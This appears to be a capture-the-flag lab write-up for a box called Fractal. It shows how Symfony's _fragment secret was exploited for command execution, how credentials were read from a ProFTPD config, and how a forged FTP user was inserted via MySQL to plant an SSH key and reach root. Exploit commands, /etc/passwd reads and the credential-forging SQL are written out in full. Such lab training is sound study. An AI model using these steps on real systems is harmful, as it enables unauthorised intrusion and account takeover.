Fractal was an extremely useful box to learn and train my MySQL skills. It starts with identifying a Symfony CMS through HTTP enumeration. 

The Symfony profiler was explored, leading to finding sensitive files and obtaining database credentials. 

Using these credentials, a Symfony exploit script was executed to achieve Remote Code Execution (RCE) and gain a reverse shell.

Privilege escalation involved creating a new user via MySQL, allowing SSH access with elevated privileges, eventually leading to root access.

Checking the branch on GitHub, it is possible to view documentation about upgrading Symfony 3.x, so we might find sensitive files.

Then I decided to investigate the _profiler to find directories since I tried passing it as a URL and got nothing. I filtered by all these statuses to avoid issues.

Investigating the latest had nothing...


Says the file is not readable. So, I will try to read the file found “.yml” on GitHub.

## Exploitation

Searching a lot, I found the following article [https://al1z4deh.medium.com/how-i-hacked-28-sites-at-once-rce-5458211048d5](https://al1z4deh.medium.com/how-i-hacked-28-sites-at-once-rce-5458211048d5) 

- [https://raw.githubusercontent.com/ambionics/symfony-exploits/main/secret_fragment_exploit.py](https://raw.githubusercontent.com/ambionics/symfony-exploits/main/secret_fragment_exploit.py)

Inside it, there is an exploit from a fragment. I tried to enumerate the secret but found nothing.

- `python3 secret_fragment_exploit.py http://192.168.192.233/_fragment`
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2014.png)
    

Then I decided to use the secret found in the database.

- `python3 secret_fragment_exploit.py 'http://192.168.192.233/_fragment' --method 2 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.192.233/_fragment' --function system --parameters "id"`

Now accessing the generated URL. I was able to execute commands.

## Priv Escalation

- `cat /etc/passwd` → there is the user benoit
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2020.png)
    

I previously obtained access to database information, let's check and access it.

- `netstat -nlpt`
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2021.png)
    

I tried to access MySQL with the credentials obtained earlier but failed. Then I looked for cron, kernel version, SSH, etc., but found nothing. So I decided to look at the FTP configuration files.

- `ls -lah /etc/proftpd`
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2022.png)
    
- `cat sql.conf`
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2023.png)
    

Let's connect to SQL.

- `mysql -u proftpd -p proftpd` : `protfpd_with_MYSQL_password` → 
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2024.png)

It seems to have a password for www to access proftpd. FTP authentication through ProFTPD

I will create a new password for the user **benoit** who already exists in the system.

 

In the `{md5}` base64-encoded format. Therefore, the right way to generate a password for the user **benoit** is to use the base64-encoded MD5 hash method.


- `/bin/echo "{md5}"/bin/echo -n "hendrich" | openssl dgst -binary -md5 | openssl enc -base64`
- ```INSERT INTO `ftpuser` (`id`, `userid`, `passwd`, `uid`, `gid`, `homedir`, `shell`, `count`, `accessed`, `modified`) VALUES (NULL, 'benoit', '{md5}wZjbZseC3NVjPeEobwukRg==', 1000, 1000, '/', '/bin/bash', 0, NOW(), NOW());```

Now logging into FTP


- `ftp 192.168.192.233` `benoit:hendrich`
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2026.png)
    

- `ssh-keygen`
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2027.png)
    
- `cp id_rsa.pub authorized_keys`
- `mkdir .ssh`
- `put authorized_keys`
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2028.png)
    

- `ssh -i id_rsa benoit@192.168.192.233`
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2029.png)
    

- `sudo -l` → has permission to execute everything. sudo su works
    
    ![Untitled](../assets/img/oscp/Fractal/Untitled%2030.png)
    

- `flag`
